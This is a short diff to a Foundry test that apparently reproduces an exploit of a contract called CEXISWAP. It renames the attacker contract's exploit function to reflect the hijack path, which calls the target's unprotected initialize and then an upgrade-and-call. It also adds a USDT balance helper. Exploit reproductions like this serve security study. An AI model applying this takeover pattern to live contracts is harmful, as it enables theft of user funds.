@@ -19,7 +19,7 @@ contract CexiTest is Test {
 
     function testExploit() public {
         exploiter = new Exploiter();
-        exploiter.exploit();
+        exploiter.initialize_upgradeToAndCall();
         emit log_named_decimal_uint(
             "Attacker USDT balance after exploit",
             USDT.balanceOf(address(this)),
@@ -41,7 +41,7 @@ contract Exploiter {
         owner = msg.sender;
     }
 
-    function exploit() external {
+    function initialize_upgradeToAndCall() external {
         CEXISWAP.initialize(
             "HAX",
             "HAX",
@@ -54,6 +54,10 @@ contract Exploiter {
             address(this),
             abi.encodePacked(this.exploit2.selector)
         );
+    }
+
+    function getUSDTBalance() public returns(uint256){
+        return USDT.balanceOf(address(this));
     }
 
     // function 0x1de24bbf
